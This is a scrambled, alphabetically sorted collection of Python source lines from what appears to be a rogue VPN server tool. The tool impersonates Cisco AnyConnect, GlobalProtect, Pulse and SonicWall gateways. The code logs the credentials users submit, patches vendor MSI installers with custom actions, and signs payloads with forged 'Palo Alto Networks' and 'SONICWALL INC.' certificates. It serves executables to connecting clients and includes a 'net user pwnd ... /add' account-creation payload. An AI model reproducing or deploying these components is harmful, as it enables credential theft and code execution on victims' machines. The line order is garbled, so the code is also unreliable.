"                    print (""attr_flag 0x2e00: known for Pulse version >= 9.1R16"")"
"                    print (""unknown Pulse version"")"
"                    profile_hash=profile_hash,"
"                    raise ValueError(""Bad config"")"
"                    return plugin.handle_data(data, client_socket, client_ip)"
"                    return {'sha1': thumbprint_sha1, 'md5': thumbprint_md5}"
"                    script_path = os.path.join(self.files_dir, script['filename'])"
"                    self.__class__.__name__,"
"                    self.logger.error(f""Connection error: {e}"")"
"                    self.logger.info(f""Password: {password}"")"
"                    self.logger.info(f""Username: {username}"")"
"                    self.process_tcp_message(client_socket, data, client_ip)"
"                    server_cert_hash=self.get_thumbprint()['sha1'],"
"                    sys.stdout.write(f"""
"                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,"
"                    username TEXT,"
"                    username,"
"                    with open(feature_table, 'a', newline='') as f:"
"                    with open(os.path.join(os.path.dirname(__file__), '..', "
"                    {'platform': ""mac-intel"", 'filename': ""OnConnect.sh"", 'hash': None}"
"                    {'platform': ""mac-intel"", 'filename': ""OnDisconnect.sh"", 'hash': None},"
"                    {'platform': ""win"", 'filename': ""OnConnect.vbs"", 'hash': None},"
"                    {'platform': ""win"", 'filename': ""OnDisconnect.vbs"", 'hash': None},"
"                   ""</script></body></html>"""
"                   ""https://${document.domain}"
"                   f"""
"                   f""username={self.pulse_username}"
"                ""-in"", input_file, ""-out"", output_file,"
"                ""-in"", os.path.join(self.payload_dir, msi_file),"
"                ""/usr/bin/osslsigncode"", ""sign"", ""-pkcs12"", self.codesign_pfx_path,"
"                ""/usr/bin/osslsigncode"", ""verify"", ""-CAfile"", self.cert_manager.ca_cert_path,"
"                ""action"": 10, ""helperversion"": ""1.1.42"", ""host"": self.external_ip, "
"                ""aovAllowAlwaysOnVPN"": 0, ""aovAllowUserDisconnect"": 0,"
"                ""aovAllowNoConnectInTrustedNetwork"": 0, ""aovSecureHosts"": """","
"                ""aovUserEmail"": """", ""aovAllowAccessWhenVPNFailToConnect"": 0,"
"                ""dnsDomainSuffixes"": """""
"                ""nePrimaryDns"": ""1.1.1.1"", ""neSecondaryDns"": ""8.8.8.8"", "
"                ""port"": ""443"", ""username"": ""user"", ""extendid"": base64.b64encode(os.urandom(32)).decode()"
"                ""result"": 0,""aovTempShutDown"": 0, "
"                'Content-Type': 'application/octet-stream',"
"                'cisco_command_win': self.cisco_command_win,"
"                <td id=""bottom-bar-buttons-td"">"
"                <td id=""bottom-bar-message-td"">"
"                None,"
"                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)"
"                b"""""
"                b"""","
"                b""HTTP/1.1 200 OK"","
"                b""X-CSTP-Address: 192.168.59.128"","
"                b""X-CSTP-Client-Bypass-Protocol: false"","
"                b""X-CSTP-DNS: 8.8.8.8"","
"                b""X-CSTP-DPD: 30"","
"                b""X-CSTP-Disable-Always-On-VPN: false"","
"                b""X-CSTP-Disconnected-Timeout: 1800"","
"                b""X-CSTP-Hostname: 192.168.49.159"","
"                b""X-CSTP-Idle-Timeout: 1800"","
"                b""X-CSTP-Keep: false"","
"                b""X-CSTP-Keepalive: 20"","
"                b""X-CSTP-Lease-Duration: 1209600"","
"                b""X-CSTP-MSIE-Proxy-Lockdown: false"","
"                b""X-CSTP-MTU: 1367"","
"                b""X-CSTP-Netmask: 255.255.255.0"","
"                b""X-CSTP-Protocol: Copyright (c) 2004 Cisco Systems, Inc."","
"                b""X-CSTP-Quarantine: false"","
"                b""X-CSTP-Routing-Filtering-Ignore: false"","
"                b""X-CSTP-Session-Timeout-Alert-Interval: 60"","
"                b""X-CSTP-Session-Timeout-Remaining: none"","
"                b""X-CSTP-Session-Timeout: none"","
"                b""X-CSTP-Smartcard-Removal-Disconnect: true"","
"                b""X-CSTP-Split-Include: 192.168.59.0/255.255.255.0"","
"                b""X-CSTP-TCP-Keepalive: false"","
"                b""X-CSTP-Tunnel-All-DNS: false"","
"                b""X-CSTP-Version: 1"","
"                b""X-DTLS-DPD: 30"","
"                b""X-DTLS-Keepalive: 20"","
"                b""X-DTLS-MTU: 1390"","
"                b""X-DTLS-Port: 80"","
"                b""X-DTLS-Session-ID: 456F8991F6A915202E1FF2BCE7DC22F3C6791C806311F7CC93E551E97DC1222D"","
"                b""X-DTLS12-CipherSuite: ECDHE-RSA-AES256-GCM-SHA384"","
"                b""codesign"","
"                cert_path=cert_path, "
"                cert_path=self.apple_cert_path,"
"                cert_path=self.codesign_cert_path,"
"                codesign_certificate,"
"                codesign_private_key,"
"                common_name=""Developer ID Installer: Palo Alto Networks (PXPZ95SK77)"","
"                common_name=""Palo Alto Networks"","
"                common_name=""SONICWALL INC."","
"                content = self.render_file(script_path, context)"
"                enc_type = ""AES-128"""
"                enc_type = ""AES-256"""
"                encoding=serialization.Encoding.PEM,"
"                format=serialization.PrivateFormat.TraditionalOpenSSL,"
"                if not self.server.plugin_manager.handle_data(first_line, self.connection, self.client_address[0]):"
"                if plugin.is_enabled() and plugin.can_handle_data(data, client_socket, client_ip):"
"                key_path=self.codesign_key_path,"
"                logging.debug(f""SNI hostname requested: {sni_name}"")"
"                logging.error(f""Error in SNI callback: {e}"")"
"                logging.error(f""Error in plugin {plugin.__class__.__name__}: {e}"")"
"                logging.info(f""Certificate is validly signed by our CA. Will not re-generate."")"
"                logging.info(f""MSI version updated from {current_version} to {new_version}"")"
"                logging.info(f""Received DPD-REQ packet. Replying with DPD-RESP"")"
"                logging.info(f""Received compressed packet"")"
"                logging.info(f""Received disconnect packet. Message: {packet_data[1:].decode()}"")"
"                logging.info(f""Received keepalive packet"")"
"                logging.info(f""Received terminate packet"")"
"                logging.warning(f""Certificate is not validly signed by the current CA: {e}. Will re-generate."")"
"                logging.warning(f""Packet data: {packet_data.hex()}"")"
"                logging.warning(f""Unknown packet type: {packet_type:04x}"")"
"                mactype = ""MD5"""
"                mactype = ""SHA1"""
"                mactype = ""SHA256"""
"                mactype = ""unknown"""
"                os.replace(output_file, input_file)"
"                p[8], p[9], p[10], p[11],"
"                password=password,"
"                patcher.add_custom_action(output_file, f""_{random_hash()}"", 50, "
"                patcher.add_file(output_file, self.msi_add_file, random_hash(), ""DefaultFeature"")"
"                pfx_path=pfx_path,"
"                plugin_name=self.__class__.__name__,"
"                print (""Bad attribute length"")"
"                print (""Receive route of unknown type %s"" % hex(route_type))"
"                print (""Received split exclude route: %s"" % route)"
"                print (""Received split include route %s"" % route)"
"                profile_xml = self.render_template(""profile.xml"")"
"                raise Exception(""Invalid packet"")"
"                raise Exception(f""Invalid packet length: {packet_length}"")"
"                raise ValueError(""Bad config: ffff != 0xffff"")"
"                raise ValueError(""Config data too short (2)"")"
"                raise ValueError(""Packet too short to parse AVP with vendor"")"
"                reader = csv.reader(f, delimiter='"
"                reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_CLIENT_AUTH_CHALLENGE,"
"                reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_VERSION_RESPONSE,"
"                return '<HTML><HEAD><META HTTP-EQUIV=""Pragma"" CONTENT=""no-cache"">' "
"                return Response(content, status=200, mimetype=""application/octet-stream"")"
"                return Response(response, status=200, mimetype='text/html', headers=headers)"
"                return redirect(f""/msi/GlobalProtect.pkg"", code=302)"
"                return redirect(f""/msi/GlobalProtect64.msi"", code=302)"
"                return {""status"":""touch ok"", ""nxnoneedtouchsession"": ""true""}"
"                row = next(reader, None)"
"                self.ca_cert = x509.load_pem_x509_certificate(f.read(), default_backend()) "
"                self.ca_cert = x509.load_pem_x509_certificate(f.read(), default_backend())"
"                self.ca_key = serialization.load_pem_private_key(f.read(), password=None, backend=default_backend())"
"                self.logger.debug(f""Using dynamic thumbprint for {self.dns_name}: {dynamic_thumbprint}"")"
"                self.logger.error(f""Download file not found: {file_path}"")"
"                self.logger.error(f""Error processing packet: {e}"")"
"                self.logger.error(f""Failed to sign {msi_file}: {proc.returncode}"")"
"                self.logger.error(f""Failed to verify {msi_file}: {proc.returncode}"")"
"                self.logger.info(""Handling AUTH-REPLY"")"
"                self.logger.info(""Handling INIT"")"
"                self.logger.info(""Sending auth reply"")"
"                self.logger.info(f""Added custom action to {msi_file}"")"
"                self.logger.info(f""Added file {self.msi_add_file} to {msi_file}"")"
"                self.logger.info(f""Incremented MSI version for {msi_file}"")"
"                self.logger.info(f""Received username: {username} and password: {password}"")"
"                self.logger.info(f""Sending prelogin.xml"")"
"                self.logger.info(f""Signed {msi_file}"")"
"                self.logger.warning(""Failed to extract credentials"")"
"                self.logger.warning(f""Warning: {input_file} does not exist and could not be compiled. Payload will not be served."")"
"                self.plugin_manager.register_plugin(plugin, "
"                username=username,"
"                with context.wrap_socket(sock, server_hostname=server_address) as wrapped_sock:"
"                writer = csv.writer(f, delimiter='"
"                writer.writerow([component_key, '{' "
"                writer.writerow([feature_key, component_key])"
"                writer.writerow([file_key, component_key, file_name, file_size, '', '', 512, new_sequence])"
"                writer.writerow([name, '', '1'])"
"                writer.writerow([name, str(type), source_key, target])"
"                writer.writerow([new_disk_id, new_sequence, '', f'"
"                writer.writerow([source_key, source])"
"                wrpcap(self.pcap_filename, packet, append=True)"
"                xml = self.render_template(""login.xml"","
"                xml = self.render_template(""prelogin.xml"", vpn_name=self.vpn_name)"
"               f""EtherType={hex(ether_type)} ({ether_str}), Length={packet_length}"")"
"               f""Flags={self.flags}, Vendor={self.vendor}, "" "
"               f""Value={self.value.hex()}"""
"               f'Message Length={self.message_length}, Message Identifier={hex(self.message_identifier)}, ' "
"               int.from_bytes(avp.value, 'big') == 0x10"
"               self.message_identifier.to_bytes(4, 'big') "
"               self.message_length.to_bytes(4, 'big') "
"               self.message_type.to_bytes(4, 'big') "
"            ""--static"", ""-lwtsapi32"", ""-luserenv"""
"            ""-L"", ""/usr/x86_64-w64-mingw32/lib"","
"            ""-in"", os.path.join(self.payload_dir, 'NACAgent.exe'),"
"            ""-o"", output_file, source_file,"
"            ""/usr/bin/osslsigncode"", ""verify"", ""-CAfile"", self.cert_manager.ca_cert_path,"
"            ""/usr/bin/x86_64-w64-mingw32-gcc"","
"            ""GlobalProtect"","
"            ""PALO_ALTO_MSI_COMMAND"","
"            ""ca_certificate"": """","
"            ""dns_name"": self.dns_name,"
"            ""gateway_ip"": self.external_ip,"
"            ""nachovpn=nachovpn.server:main"","
"            ""version"": ""6.3.2-376"""
"            'cert_manager': self.cert_manager,"
"            'db_manager': self.db_manager,"
"            'dns_name': os.getenv('SERVER_FQDN', socket.gethostname()),"
"            'external_ip': os.getenv('EXTERNAL_IP', socket.gethostbyname(socket.gethostname())),"
"            'write_pcap': os.getenv(""WRITE_PCAP"", False),"
"            (self.host, self.port), "
"            <bundle CFBundleVersion=""{bundle_version}"" id=""com.paloaltonetworks.GlobalProtect.gplock""/>"
"            <entry name=""Any"">"
"            ExtendedKeyUsageOID.CLIENT_AUTH,"
"            ExtendedKeyUsageOID.CODE_SIGNING,"
"            ExtendedKeyUsageOID.SERVER_AUTH,"
"            NULL, NULL, NULL, FALSE, dwCreationFlags, pEnv, L""C:"
"            ObjectIdentifier(""1.2.840.113635.100.4.13""),    "
"            ObjectIdentifier(""1.2.840.113635.100.6.1.14""),  "
"            VPNStreamRequestHandler,"
"            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)"
"            and self.cert_is_valid(self.dns_cert_path, self.dns_name):"
"            and self.cert_is_valid(self.ip_cert_path, self.ip_address):"
"            attrs.append(Attribute(attr_type, attr_len, p[:attr_len]).to_dict())"
"            avp_list.append(AVP(code=0xD49, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=(4).to_bytes(4, 'big')))"
"            avp_list.append(AVP(code=0xD4A, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=(1).to_bytes(4, 'big')))"
"            avp_list.append(AVP(code=0xD53, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=os.urandom(16).hex().encode())) "
"            avp_list.append(AVP(code=0xD54, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'10.0.1.4'))"
"            avp_list.append(AVP(code=0xD55, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=self.get_thumbprint()['md5'].encode()))    "
"            avp_list.append(AVP(code=0xD56, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=LICENSE_ID.encode()))"
"            avp_list.append(AVP(code=0xD57, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'"
"            avp_list.append(AVP(code=0xD5C, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=(3600).to_bytes(4, 'big')))     "
"            avp_list.append(AVP(code=0xD6B, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'"
"            avp_list.append(AVP(code=0xD75, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'"
"            avp_list.append(AVP(code=0xD8B, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=os.urandom(8).hex().encode()))  "
"            avp_list.append(AVP(code=0xD8D, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b''))                           "
"            cab_name = f""_{random_hash()}"""
"            cab_path = os.path.join(temp_dir, cab_name)"
"            cert = x509.load_pem_x509_certificate(f.read(), default_backend())"
"            cert_path = os.path.join(os.getcwd(), 'certs', 'ca.crt')"
"            cert_path = os.path.join(self.cert_dir, 'apple.cer')"
"            cert_path = os.path.join(self.cert_dir, 'codesign.cer')"
"            certfile=self.ip_cert_path, "
"            component_table = os.path.join(temp_dir, 'Component.idt')"
"            content_commitment=False,"
"            critical=False,"
"            critical=True,"
"            custom_action_file = os.path.join(temp_dir, 'CustomAction.idt')"
"            data = json.dumps(token).replace(' ', '')"
"            data_encipherment=False,"
"            decipher_only=False,"
"            digital_signature=True,"
"            dns_server = ""%d.%d.%d.%d"" % (data[0], data[1], data[2], data[3])"
"            eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=self.next_eap_identifier(), eap_data=eap_data)"
"            eap = EAPPacket(vendor=JUNIPER_1, code=EAP_SUCCESS, identifier=self.next_eap_identifier(), eap_data=b'')"
"            elif 'type=""auth-reply""' in body:"
"            encipher_only=False,"
"            encoding=serialization.Encoding.PEM,"
"            f'Length={self.length}, Data={self.eap_data.hex()}'"
"            feature_components_table = os.path.join(temp_dir, 'FeatureComponents.idt')"
"            feature_table = os.path.join(temp_dir, 'Feature.idt')"
"            file_path = os.path.join(self.payload_dir, file_name)"
"            file_table = os.path.join(temp_dir, 'File.idt')"
"            for i in range(0, len(data), size):"
"            format=serialization.PrivateFormat.TraditionalOpenSSL,"
"            gateway = ""%d.%d.%d.%d"" % (data[0], data[1], data[2], data[3])"
"            generator = VPNConfigGenerator(logon_script=self.logon_script, logon_script_macos=self.logon_script_macos)"
"            handler.send_header('Connection', 'Keep-Alive')"
"            handler.send_header('Content-Type', 'application/octet-stream')"
"            handler.send_header('Content-Type', 'text/html')"
"            handler.send_header('Keep-Alive', 'timeout=15')"
"            handler.send_header('Pragma', 'no-cache')"
"            handler.send_header('Strict-Transport-Security', 'max-age=31536000')"
"            handler.send_header('Upgrade', 'IF-T/TLS 1.0')"
"            handler.send_header(header, value)"
"            handler.wfile.write(b"""
"            html = ""<html><body><script>window.location.href="" "
"            if 'type=""init""' in body:"
"            if file_name not in ['GlobalProtect.pkg', 'GlobalProtect.msi', 'GlobalProtect64.msi']:"
"            if int.from_bytes(self.data[0:4], byteorder='big') != self.Constants.MAGIC_NUMBER:"
"            if issubclass(plugin, VPNPlugin) and plugin != VPNPlugin:"
"            if not os.path.exists(os.path.join(self.payload_dir, 'NACAgent.exe')):"
"            if not os.path.exists(os.path.join(self.payload_dir, 'NXSetupU.exe')):"
"            if not os.path.exists(os.path.join(self.payload_dir, 'NXSetupU.exe.manifest')):"
"            if request.method == ""POST"":"
"            input_file = os.path.join(self.download_dir, msi_file)"
"            input_file = os.path.join(self.payload_dir, msi_file)"
"            ip, subnet_mask = route['route'].split('/')"
"            ip_address = ""%d.%d.%d.%d"" % (data[0], data[1], data[2], data[3])"
"            key_agreement=False,"
"            key_cert_sign=False,"
"            key_encipherment=False,"
"            key_path = os.path.join(self.cert_dir, 'apple.key')"
"            key_path = os.path.join(self.cert_dir, 'codesign.key')"
"            key_size=2048,"
"            key_usage,"
"            logging.error(""ProductVersion property not found in MSI"")"
"            logging.error(f""Certificate for {cert_common_name} is not valid for {common_name}"")"
"            logging.error(f""Certificate for {common_name} is expired"")"
"            logging.error(f""Database initialization error: {e}"")"
"            logging.error(f""Error getting thumbprint from server {server_address}: {e}"")"
"            logging.error(f""Error logging credentials: {e}"")"
"            logging.error(f""Error parsing packet: {e}"")"
"            logging.error(f""Error processing request from {self.client_address[0]}: {e}"")"
"            logging.info(""Loading existing CA certificate"")"
"            logging.info(f""Database initialized successfully at {self.db_path}"")"
"            logging.info(f""Generating new certificate for: {self.dns_name}"")"
"            logging.info(f""Generating new certificate for: {self.ip_address}"")"
"            logging.info(f""Generating new codesigning certificate for: {common_name}"")"
"            logging.info(f""Loading existing codesigning certificate for: {common_name}"")"
"            logging.info(f""MSI version updated from {current_version} to {new_version}"")"
"            logging.info(f""New ProductCode: {new_product_code}"")"
"            logging.info(f""Rebuilding MSI from: {temp_dir}"")"
"            logging.info(f""Server listening on {self.host}:{self.port}"")"
"            logging.info(f""Skipping disabled plugin: {plugin_class.__name__}"")"
"            logging.info(f""Using existing certificate for: {self.dns_name}"")"
"            logging.info(f""Using existing certificate for: {self.ip_address}"")"
"            logging.warning(f""Certificate was not issued by our CA. Will not re-generate."")"
"            major, minor, patch = map(int, version.split('.'))"
"            media_table = os.path.join(temp_dir, 'Media.idt')"
"            msilib.add_stream(db, cab_name, cab_path)"
"            net_mask = ""%d.%d.%d.%d"" % (data[0], data[1], data[2], data[3])"
"            new_version = f""{major}.{minor}.{patch}"""
"            os.getenv('SERVER_MD5_THUMBPRINT', '') != '':"
"            os.getenv('SERVER_SHA1_THUMBPRINT', '') != '' or "
"            os.makedirs(os.path.dirname(pcap_filename), exist_ok=True)"
"            os.path.exists(pfx_path) and self.cert_is_valid(cert_path, common_name):"
"            output_file = os.path.join(self.payload_dir, f""{msi_file}.signed"")"
"            output_file = os.path.join(self.payload_dir, msi_file)"
"            packet_length = int.from_bytes(self.data[4:6], byteorder='big')"
"            parser = CTSP(data, client_socket, packet_handler=self.packet_handler)"
"            pfx_path = os.path.join(self.cert_dir, 'codesign.pfx')"
"            print (""Bad attribute header"")"
"            print (""DNS search domain: %s"" % data[0:attr_len].split(b'"
"            print (""DNS server (IPv6)"")"
"            print (""DNS server: %s"" % dns_server)"
"            print (""Disconnect when routes changed: %d"" % data[0])"
"            print (""ESP HMAC: 0x%04x (%s)"" % (val, mactype))"
"            print (""ESP encryption: 0x%04x (%s)"" % (val, enc_type))"
"            print (""ESP key lifetime: %u bytes"" % lifetime_bytes)"
"            print (""ESP key lifetime: %u seconds"" % lifetime_secs)"
"            print (""ESP only: %d"" % data[0])"
"            print (""ESP port: %d"" % i)"
"            print (""ESP replay protection: %d"" % esp_replay_protect)"
"            print (""ESP to SSL fallback: %u seconds"" % fallback_secs)"
"            print (""Enforce IPv4: %d"" % data[0])"
"            print (""Enforce IPv6: %d"" % data[0])"
"            print (""IPv6 split exclude"")"
"            print (""IPv6 split include"")"
"            print (""Internal IPv6 address"")"
"            print (""Internal Legacy IP address: %s"" % ip_address)"
"            print (""Internal gateway address: %s"" % gateway)"
"            print (""Logon script: %s"" % logon_script)"
"            print (""MTU %d from server"" % mtu)"
"            print (""Netmask: %s"" % net_mask)"
"            print (""Processing Pulse main config data for server version < 9.1R14"")"
"            print (""Pulse ESP tunnel allowed to carry 6in4 or 4in6 traffic: %d"" % data[0])"
"            print (""TOS copy: %d"" % tos_copy)"
"            print (""Tunnel routes take precedence: %d"" % data[0])"
"            print (""Tunnel routes with subnet access (also 4001 set): %d"" % data[0])"
"            print (""Unknown attr 0x%x len %d: %s"" % (attr_type, attr_len, data[0:attr_len].hex()))"
"            print (""WINS server: %s"" % wins_server)"
"            print(""Custom action added"")"
"            print(f""Output file {args.output} already exists"")"
"            print(f""[!] Certificate file '{arg}' not found"")"
"            product_code_record.SetString(1, new_product_code)"
"            product_code_view = db.OpenView(""UPDATE "
"            property_file = os.path.join(temp_dir, 'Property.idt')"
"            public_exponent=65537,"
"            r""net user pwnd Passw0rd123! /add "
"            raise Exception(""Failed to download MSI files"")"
"            raise Exception(""No template environment configured"")"
"            raise ValueError(""Config data too short"")"
"            raise ValueError(""Data too short to parse IF-T packet"")"
"            raise ValueError(""Packet too short to parse AVP"")"
"            raise ValueError(""Unrecognised data type"")"
"            rec.SetInteger(5, 2)"
"            rec.SetInteger(8, 0)"
"            rec.SetString(1, feature_key)"
"            rec.SetString(2, '')"
"            rec.SetString(3, '')"
"            rec.SetString(4, '')"
"            rec.SetString(6, 1)"
"            rec.SetString(7, 'TARGETDIR')"
"            reply = IFTPacket(vendor_id=VENDOR_JUNIPER, message_type=0x8F, message_identifier=0x01FD, message_value=b'"
"            reply = IFTPacket(vendor_id=VENDOR_JUNIPER, message_type=1, message_identifier=0x01FB, message_value=config)"
"            reply = IFTPacket(vendor_id=VENDOR_JUNIPER, message_type=1, message_identifier=0x01FC, message_value=esp_config)"
"            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x05, message_identifier=0x01F8, message_value=eap.to_bytes())"
"            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x5, message_identifier=0x01F7, message_value=eap.to_bytes())"
"            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x96, message_identifier=0x01FE, message_value=LICENSE_ID.encode())"
"            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_CLIENT_AUTH_CHALLENGE, message_identifier=0x01F9,"
"            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_CLIENT_AUTH_SUCCESS, message_identifier=0x01FA, message_value=eap.to_bytes())"
"            resp = Response('<HTML><HEAD><META HTTP-EQUIV=""Pragma"" CONTENT=""no-cache""><meta http-equiv=""refresh"" content=""0"
"            resp = make_response('{""response"":""OK""}')"
"            resp = self.process(data, client_socket)"
"            resp.set_cookie('swap', self.random_swap())"
"            response = client.get(handler.path, headers=dict(handler.headers))"
"            response = client.post(handler.path, data=body, headers=dict(handler.headers))"
"            return Response(""Connection Established"", status=200, mimetype='text/plain')"
"            return Response(file_content, headers=headers)"
"            return Response(response, status=200, mimetype='text/html')"
"            return Response(xml, mimetype='application/xml')"
"            return f""<html><head></head><body><script>window.location.href='{url}'"
"            return jsonify({""message"": ""OK""})"
"            return redirect(f""/msi/GlobalProtect.msi"", code=302)"
"            return self.ca_cert_path, self.ca_key_path"
"            return self.ca_key_path, self.ca_cert_path"
"            return self.dns_cert_path, self.dns_key_path"
"            return self.handle_data(b'', handler.connection, handler.client_address[0])"
"            return self.ip_cert_path, self.ip_key_path"
"            return self.render_template('404.html'), 404"
"            return send_file(os.path.join(self.payload_dir, 'NACAgent.exe'))"
"            return send_file(os.path.join(self.payload_dir, 'NXSetupU.exe'))"
"            return send_file(os.path.join(self.payload_dir, 'NXSetupU.exe.manifest'))"
"            return {""preferVPN"": ""SSLVPN"",""allowedVPN"": ""NONE""}"
"            route = ""%d.%d.%d.%d/%d.%d.%d.%d"" % ("
"            script_path = os.path.join(self.files_dir, os.path.basename(name.lstrip('scripts_')))"
"            self._send_flask_response(response, handler)"
"            self.apple_cert_path,"
"            self.apple_key_path,"
"            self.cert_manager,"
"            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)"
"            self.create_cab_file(file_path, file_key, cab_path)"
"            self.gateway_config[""ca_certificate""] = f.read()"
"            self.gateway_config[""version""] = bump"
"            self.gateway_config[""version""].replace('-', 'f'),"
"            self.handle_data(None, handler.connection, handler.client_address[0])"
"            self.logger.debug(f""Received KEEP_ALIVE Packet from {client_ip}"")"
"            self.logger.debug(f""Serving {file_name}"")"
"            self.logger.debug(f""User-Agent: {user_agent}"")"
"            self.logger.error(""MSI files not found, skipping signing"")"
"            self.logger.error(""Windows MSI signing not supported yet"")"
"            self.logger.error(""Windows MSI verification not supported yet"")"
"            self.logger.error(""Windows code signing certificate not found, skipping signing"")"
"            self.logger.error(""Windows payload verification not supported yet"")"
"            self.logger.error(""msitools not found, skipping patching"")"
"            self.logger.error(""osslsigncode not found, skipping signing"")"
"            self.logger.error(""osslsigncode not found, skipping verification"")"
"            self.logger.error(f""CONNECT error: {e}"")"
"            self.logger.error(f""Error handling Cisco data: {e}"")"
"            self.logger.error(f""Failed to bootstrap. Disabling {self.__class__.__name__}"")"
"            self.logger.error(f""Failed to verify {os.path.join(self.payload_dir, 'NACAgent.exe')}: {proc.returncode}"")"
"            self.logger.error(f""MSI version file not found"")"
"            self.logger.info(""Closing CONNECT tunnel"")"
"            self.logger.info(""Handling OEM customization"")"
"            self.logger.info(""Handling POST"")"
"            self.logger.info(""Loading profile file"")"
"            self.logger.info('Auth completed, sending configuration and launching application...')"
"            self.logger.info('Received anonymous auth, sending server info ..')"
"            self.logger.info('Received credentials, sending back some cookies ..')"
"            self.logger.info(f""AVP: Code={avp.code:04X}, Value={avp.value.hex()}"")"
"            self.logger.info(f""Bumping version from {latest_version} to {bump}"")"
"            self.logger.info(f""Run downloader to fetch latest MSI files, or add manually"")"
"            self.logger.info(f""Run downloader to fetch latest MSI files, or manually add {version_file}"")"
"            self.logger.info(f""handle CONNECT: {path}"")"
"            self.logger.info(f""{os.path.join(self.payload_dir, 'NACAgent.exe')} already exists and is validly signed"")"
"            self.logger.warning(""MSI files already patched, skipping"")"
"            self.logger.warning(f""MSI files not found in download directory: {self.download_dir}"")"
"            self.logger.warning(f""Received Unhandled TCP message from {client_ip}: {data.hex()}"")"
"            self.logger.warning(f""UNKNOWN Packet Type: {ether_type}"")"
"            self.logger.warning(f""Warning: {input_file} could not be signed. Payload will not be served."")"
"            self.pkg_command,"
"            self.process_attr(attr_type, p, attr_len)"
"            self.template_env = Environment(loader=FileSystemLoader([template_dir, default_dir]))"
"            sequence_file = os.path.join(temp_dir, f'{sequence}.idt')"
"            shutil.copy(input_file, output_file)"
"            shutil.move(output_file, input_file)"
"            subprocess.run(['msibuild', msi_path, "
"            subprocess.run(['msibuild', msi_path, '-a', cab_name, cab_path], check=True)"
"            subprocess.run(['msibuild', msi_path, '-i', os.path.join(temp_dir, 'Property.idt')], check=True)"
"            subprocess.run(['msibuild', msi_path,"
"            subprocess.run(['msidump', '-d', temp_dir, msi_path], check=True)"
"            update_record.SetString(1, new_version)"
"            update_view = db.OpenView(""UPDATE "
"            url = f""sonicwallconnectagent://{encoded}"""
"            value = ""nginx"""
"            vendor = int.from_bytes(data[8:12], 'big')"
"            view = db.OpenView(""INSERT INTO "
"            wins_server = ""%d.%d.%d.%d"" % (data[0], data[1], data[2], data[3])"
"            with open(component_table, 'a', newline='') as f:"
"            with open(custom_action_file, 'a', newline='') as f:"
"            with open(data, 'rb') as f:"
"            with open(feature_components_table, 'a', newline='') as f:"
"            with open(feature_table, 'r') as f:"
"            with open(file_path, 'rb') as f:"
"            with open(file_table, 'a', newline='') as f:"
"            with open(file_table, 'r') as f:"
"            with open(media_table, 'a', newline='') as f:"
"            with open(media_table, 'r') as f:"
"            with open(property_file, 'a', newline='') as f:"
"            with open(property_file, 'r') as f:"
"            with open(property_file, 'w', newline='') as f:"
"            with open(self.ca_cert_path, 'rb') as f:"
"            with open(self.ca_key_path, 'rb') as f:"
"            with open(sequence_file, 'a', newline='') as f:"
"            with socket.create_connection((server_address, 443), timeout=5) as sock:"
"            x509.AuthorityKeyIdentifier.from_issuer_public_key(self.ca_key.public_key()),"
"            x509.BasicConstraints(ca=True, path_length=None),"
"            x509.ExtendedKeyUsage(eku_list),"
"            x509.NameAttribute(NameOID.COMMON_NAME, common_name)"
"            x509.NameAttribute(NameOID.COMMON_NAME, common_name),"
"            x509.NameAttribute(NameOID.COMMON_NAME, self.ca_common_name),"
"            x509.SubjectAlternativeName(san_list),"
"            x509.SubjectKeyIdentifier.from_public_key(self.ca_key.public_key()),"
"            xml = self.render_template(""profile.xml"")"
"            xml = self.render_template('getconfig.xml', "
"            xml = self.render_template('pwresponse.xml', "
"           int.from_bytes(data[0:4], 'big') != EXPANDED_JUNIPER or "
"           int.from_bytes(data[4:8], 'big') != 1:"
"           not os.path.exists(os.path.join(self.download_dir, ""GlobalProtect64.msi"")):"
"           not os.path.exists(os.path.join(self.payload_dir, ""GlobalProtect64.msi"")):"
"           os.path.exists(os.path.join(self.payload_dir, ""GlobalProtect64.msi"")) and "
"        """"""Calculate the certificate thumbprint"""""""
"        """"""Check if the certificate is valid"""""""
"        """"""Check if this plugin can handle the given data"""""""
"        """"""Close the database connection."""""""
"        """"""Create SSL context with SNI support and proper TLS configuration"""""""
"        """"""Determine if this plugin can handle the HTTP request"""""""
"        """"""Generate a server certificate"""""""
"        """"""Generate an Apple code signing certificate"""""""
"        """"""Get the certificate thumbprint from a server"""""""
"        """"""Handle raw VPN data"""""""
"        """"""Helper method to log credentials to the database."""""""
"        """"""Initialize the database connection and create tables if they don't exist."""""""
"        """"""Load or generate a certificate for the server's DNS name"""""""
"        """"""Load or generate a certificate for the server's external IP address"""""""
"        """"""Load or generate the CA certificate"""""""
"        """"""Log credentials using prepared statements."""""""
"        """"""Register a plugin"""""""
"        """"""Render a template with the given context"""""""
"        """"""Setup the certificates and load the SSL context"""""""
"        """"""Try each plugin to handle HTTP requests"""""""
"        """"""Try each plugin to handle raw VPN data"""""""
"        ""cabarchive>=0.2.4"","
"        ""console_scripts"": ["
"        ""cryptography==42.0.5"","
"        ""flask>=3.0.2"","
"        ""jinja2>=3.0.0"","
"        ""pycryptodome>=3.20.0"","
"        ""requests>=2.31.0"","
